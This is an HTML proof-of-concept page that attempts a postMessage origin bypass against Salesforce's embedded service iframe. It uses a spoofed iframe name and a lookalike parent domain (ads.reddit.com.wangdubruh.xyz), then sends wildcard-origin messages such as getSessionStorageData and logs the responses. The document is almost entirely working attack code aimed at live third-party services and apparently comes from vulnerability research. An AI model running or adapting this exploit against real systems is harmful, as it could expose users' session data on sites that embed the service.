<!DOCTYPE html>
<html>
  <head>
    <title>Salesforce Bypass Testing</title>
    <style>
      body { font-family: sans-serif; padding: 1rem; }
      iframe { width: 600px; height: 400px; border: 1px solid #ccc; }
    </style>
  </head>
  <body>
    <h3>PostMessage Origin Bypass PoC</h3>
    <p>Testing <code>window.name</code>, timing, and multiple message types.</p>

    <iframe
      id="sf-iframe"
      name="https://ads.reddit.com"
      src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://ads.reddit.com.wangdubruh.xyz"
    ></iframe>

    <script>
      const iframe = document.getElementById("sf-iframe");

      iframe.onload = () => {
        console.log("[+] Iframe loaded. Sending messages after delay...");

        // Delay to let iframe initialize
        setTimeout(() => {
          const testMessages = [
            {
              method: "getSessionStorageData",
              domain: "ads.reddit.com",
              deploymentId: "test123"
            },
            {
              method: "session.updateStorage",
              domain: "ads.reddit.com",
              data: {
                deploymentId: "test123",
                isSamePageNavigation: true,
                isRefresh: false
              }
            },
            {
              method: "session.frameReady",
              domain: "ads.reddit.com"
            },
            {
              method: "session.onLoad",
              domain: "ads.reddit.com"
            }
          ];

          testMessages.forEach((msg, i) => {
            console.log(`[ðŸ“¤] Sending message ${i + 1}:`, msg);
            iframe.contentWindow.postMessage(msg, "*");
          });
        }, 1000);
      };

      // Receive responses
      window.addEventListener("message", (event) => {
        console.log("[ðŸ“©] Message from iframe:", event.data);
      });
    </script>
  </body>
</html>
